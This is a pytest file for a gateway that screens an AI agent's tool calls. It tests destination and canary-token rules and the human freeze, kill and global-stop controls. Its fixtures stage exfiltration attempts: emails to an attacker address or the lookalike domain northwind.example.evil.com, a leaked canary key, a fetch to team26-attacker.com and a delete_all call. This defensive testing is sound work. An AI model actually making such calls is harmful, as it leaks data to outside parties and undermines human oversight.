"""Gate tests: hard rules, and freeze -> unfreeze / kill / STOP. No Bedrock calls."""

import threading
import time

import pytest

from engine.detection.rules import hard_rule
from engine.dev.seed import ATTACKER, CANARY, seed
from engine.gateway import gate
from engine.store import events

OK_MAIL = {"to": "bob@northwind.example", "subject": "Brief", "body": "hello"}
BAD_MAIL = {"to": ATTACKER, "subject": "Q4 sync prep", "body": "c001,..."}


@pytest.mark.parametrize("tool, args, rule", [
    ("send_email", OK_MAIL, None),
    ("send_email", BAD_MAIL, "DEST_NOT_ALLOWED"),
    ("send_email", {**OK_MAIL, "to": f"bob@northwind.example, {ATTACKER}"}, "DEST_NOT_ALLOWED"),
    ("send_email", {**OK_MAIL, "to": "bob@northwind.example.evil.com"}, "DEST_NOT_ALLOWED"),
    ("send_email", {**OK_MAIL, "body": f"key {CANARY}"}, "CANARY"),
    ("fetch_url", {"url": "https://intranet.northwind.example/a"}, None),
    ("fetch_url", {"url": "https://team26-attacker.com/x"}, "DEST_NOT_ALLOWED"),
    ("delete_all", {}, "TOOL_NOT_ALLOWED"),
])
def test_hard_rules(tool, args, rule):
    hit = hard_rule("assistant", tool, args)
    assert (hit[0] if hit else None) == rule


@pytest.fixture
def run(tmp_path, monkeypatch):
    monkeypatch.setattr(events, "DB_PATH", tmp_path / "events.db")
    events.reset()
    gate.STOP.clear()
    run = gate.LiveRun(id="run_t", agent="assistant", task="t", user_name="Bob",
                       user_email="bob@northwind.example", calendar="bob",
                       services=seed(tmp_path / "prod.db"), status="running")
    gate.runs = {run.id: run}
    yield run
    events.reset()


def call_in_thread(run, args):
    out = {}
    t = threading.Thread(target=lambda: out.update(gate.execute(run, "send_email", args)))
    t.start()
    for _ in range(50):
        if run.status == "frozen":
            break
        time.sleep(0.05)
    return t, out


def test_allowed_call_runs(run):
    assert gate.execute(run, "send_email", OK_MAIL)["status"] == "sent"
    assert len(run.services.outbox()) == 1


def test_freeze_then_unfreeze_runs_the_call(run):
    t, out = call_in_thread(run, BAD_MAIL)
    assert run.status == "frozen" and run.incident_id
    assert run.services.outbox() == []  # nothing left while frozen
    gate.unfreeze(run.id, "gabi", "False positive")
    t.join(2)
    assert out["status"] == "sent"


def test_on_hit_block_denies_call_and_keeps_run(run, monkeypatch):
    monkeypatch.setenv("MIRAGE_ON_HIT", "block")
    assert gate.execute(run, "send_email", BAD_MAIL)["error"]
    assert run.status == "running" and not run.incident_id
    assert run.services.outbox() == []
    decisions = [e.payload for e in events.read() if e.type == "gate.decision"]
    assert decisions[-1]["decision"] == "block" and decisions[-1]["rule_id"] == "DEST_NOT_ALLOWED"
    assert gate.execute(run, "send_email", OK_MAIL)["status"] == "sent"


def test_freeze_then_kill_revokes(run):
    t, out = call_in_thread(run, BAD_MAIL)
    gate.kill(run.id, "gabi", "Confirmed attack")
    t.join(2)
    assert out == {"error": "Access revoked by Mirage."}
    assert run.services.outbox() == []
    assert gate.execute(run, "send_email", OK_MAIL)["error"]  # killed run stays revoked


def test_global_stop_blocks_everything(run):
    gate.global_stop("gabi", "Drill")
    assert run.status == "halted"
    assert gate.execute(run, "send_email", OK_MAIL)["error"]
    types = [e.type for e in events.read()]
    assert "global.stop" in types and "human.action" in types
